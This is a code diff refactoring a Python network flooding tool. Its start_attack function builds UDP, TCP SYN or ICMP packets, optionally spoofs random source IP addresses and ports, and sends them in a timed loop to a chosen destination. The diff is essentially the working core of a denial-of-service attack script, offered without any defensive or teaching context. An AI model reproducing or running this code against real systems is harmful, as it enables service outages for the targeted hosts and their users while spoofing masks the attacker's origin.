@@ -5,15 +5,15 @@ from enum import Enum
 from packets import *
 
 
-def getRandomIp():
+def get_random_ip():
     return "%i.%i.%i.%i" % (randint(1, 254), randint(1, 254), randint(1, 254), randint(1, 254))
 
 
-def getRandomPort():
+def get_random_port():
     return randint(1, 65535)
 
 
-def getRandomData(data_length):
+def get_random_data(data_length):
     return ''.join([str(randint(1, 254)) for i in xrange(data_length)])
 
 
@@ -26,49 +26,34 @@ class AttackType(Enum):
         return "UDP" if self == AttackType.UDP else "TCP" if self == AttackType.TCP else "ICMP"
 
 
-funcs = {AttackType.UDP: getUdpPacket, AttackType.TCP: getTcpSynPacket, AttackType.ICMP: getIcmpPacket}
+def get_packet(get_packet_func, random_source_ip, random_source_port, random_destination_port, source_ip, source_port,
+               destination_ip, destination_port, data_length):
+    sip = get_random_ip() if random_source_ip else source_ip
+    sp = get_random_port() if random_source_port else source_port
+    dp = get_random_port() if random_destination_port else destination_port
+    return get_packet_func(srcIp=sip, dstIp=destination_ip, srcPort=sp, dstPort=dp, data=get_random_data(data_length))
 
 
-def getPacket(getPacketFunc, random_source_ip, random_source_port, random_destination_port, source_ip, source_port,
-              destination_ip, destination_port, data_length):
-    if random_source_ip:
-        sIp = getRandomIp()
-    else:
-        sIp = source_ip
-    if random_source_port:
-        sP = getRandomPort()
-    else:
-        sP = source_port
-    if random_destination_port:
-        dP = getRandomPort()
-    else:
-        dP = destination_port
-    return getPacketFunc(srcIp=sIp, dstIp=destination_ip, srcPort=sP, dstPort=dP, data=getRandomData(data_length))
-
-
-def startAttack(type_attack, duration, interval, random_source_ip, random_source_port, random_destination_port,
-                source_ip,
-                source_port, destination_ip, destination_port, data_length):
-    usedRandom = random_source_ip or random_source_port or random_destination_port
+def start_attack(type_attack, duration, interval, random_source_ip, random_source_port, random_destination_port,
+                 source_ip, source_port, destination_ip, destination_port, data_length):
+    used_random = random_source_ip or random_source_port or random_destination_port
     sock = getSocket()
-    # getPacketFunc = funcs[type]
     if type_attack == AttackType.UDP:
-        getPacketFunc = getUdpPacket
-    if type_attack == AttackType.TCP:
-        getPacketFunc = getTcpSynPacket
-    if type_attack == AttackType.ICMP:
-        getPacketFunc = getIcmpPacket
+        get_packet_func = getUdpPacket
+    elif type_attack == AttackType.TCP:
+        get_packet_func = getTcpSynPacket
     else:
-        getPacketFunc = getUdpPacket
-    packet = getPacket(getPacketFunc, random_source_ip, random_source_port, random_destination_port, source_ip,
-                       source_port, destination_ip, destination_port, data_length)
+        get_packet_func = getIcmpPacket
+
+    packet = get_packet(get_packet_func, random_source_ip, random_source_port, random_destination_port, source_ip,
+                        source_port, destination_ip, destination_port, data_length)
     amount = duration
-    endtime = time() + amount
+    end_time = time() + amount
     counter = 0
-    while time() < endtime:
-        sock.sendto(packet, (destination_ip, 0 ))
+    while time() < end_time:
+        sock.sendto(packet, (destination_ip, 0))
         counter += 1
         sleep(interval)
-        if usedRandom:
-            packet = getPacket(getPacketFunc, random_source_ip, random_source_port, random_destination_port, source_ip,
-                               source_port, destination_ip, destination_port, data_length)
+        if used_random:
+            packet = get_packet(get_packet_func, random_source_ip, random_source_port, random_destination_port,
+                                source_ip, source_port, destination_ip, destination_port, data_length)
